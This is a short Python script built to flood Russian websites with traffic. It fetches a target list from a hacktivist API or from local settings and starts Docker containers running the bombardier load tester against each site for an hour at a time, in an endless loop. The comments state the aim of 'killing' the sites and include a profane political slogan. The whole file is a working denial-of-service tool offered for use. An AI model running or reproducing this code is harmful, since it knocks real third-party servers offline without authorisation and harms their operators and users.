# This is a simple Python script for killing russians sites.
# Ruskii korabl idi nahuy
import requests
import json
import docker
from settings import *
import time
from kill_all_containers import containers_clean
import atexit


atexit.register(containers_clean)



def kill_servers():
    urls = URLS[:LIMIT] if URLS else json.loads(requests.get('https://itarmy.pp.ua/api/?type=online').text)[:LIMIT]
    try:
        urls = [url.strip().decode('UTF-8') for url in urls]
    except Exception as e:
        pass
    print(urls)
    client = docker.from_env()
    for url in urls:
        cont = client.containers.run("alpine/bombardier:latest", f'-c {CONNECTIONS} -d 3600s -l {url}', detach=True)
        print(cont.logs())


if __name__ == '__main__':
    while True:
        kill_servers()
        print('Time to Sleep')
        time.sleep(3700)
        containers_clean()

